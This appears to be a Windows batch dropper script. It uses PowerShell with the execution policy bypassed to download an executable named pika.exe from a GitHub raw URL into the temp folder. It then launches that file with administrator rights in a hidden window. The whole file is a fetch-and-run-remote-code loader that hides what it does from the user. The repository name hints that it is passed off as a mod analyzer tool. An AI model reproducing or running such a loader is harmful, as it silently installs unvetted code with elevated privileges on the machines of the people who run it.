@echo off
:: Define the GitHub Raw URL for your main executable or script
set "URL=https://raw.githubusercontent.com/yajursharma987-lab/-mod_analyzey_2.0/main/pika.exe"
set "OUTPUT=%TEMP%\pika.exe"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%OUTPUT%' -Verb RunAs -WindowStyle Hidden"

exit
